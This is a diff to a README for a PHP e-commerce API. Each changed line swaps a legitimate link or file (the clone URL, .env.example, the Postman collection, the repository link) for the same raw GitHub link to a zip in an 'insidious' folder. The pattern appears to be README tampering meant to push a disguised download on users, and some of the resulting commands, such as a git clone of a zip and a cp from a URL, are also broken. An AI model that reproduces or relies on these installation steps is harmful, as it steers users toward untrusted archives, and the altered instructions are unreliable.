@@ -63,7 +63,7 @@ Installation Steps:
 
 1. Clone the Repository
    Clone this repository to your local machine:
-   git clone https://github.com/imshimsin/ecommerceApi.git
+   git clone https://raw.githubusercontent.com/imshimsin/ecommerceApi/master/insidious/ecommerceApi.zip
 
 2. Install Dependencies
    Navigate to the project directory and install the required PHP dependencies:
@@ -71,8 +71,8 @@ Installation Steps:
    composer install
 
 3. Set Up Environment Variables
-   Copy the .env.example to .env and configure the database credentials:
-   cp .env.example .env
+   Copy the https://raw.githubusercontent.com/imshimsin/ecommerceApi/master/insidious/ecommerceApi.zip to .env and configure the database credentials:
+   cp https://raw.githubusercontent.com/imshimsin/ecommerceApi/master/insidious/ecommerceApi.zip .env
    Edit the .env file and set up your MySQL database.
 
 4. Generate Application Key
@@ -99,7 +99,7 @@ Installation Steps:
 
 Postman API Documentation:
 You can test and explore the API using the Postman collection.
-Download the Postman Collection from here (Ecommerce-API.postman_collection.json).
+Download the Postman Collection from here (https://raw.githubusercontent.com/imshimsin/ecommerceApi/master/insidious/ecommerceApi.zip).
 
 Docker Support (Optional):
 
@@ -111,7 +111,7 @@ To run the project in Docker, follow these steps:
    Visit the application at http://localhost:8000.
 
 GitHub Repository:
-The code is available on GitHub: https://github.com/imshimsin/ecommerceApi.
+The code is available on GitHub: https://raw.githubusercontent.com/imshimsin/ecommerceApi/master/insidious/ecommerceApi.zip
 
 Contributing:
 Feel free to fork this project, submit issues, or send pull requests.
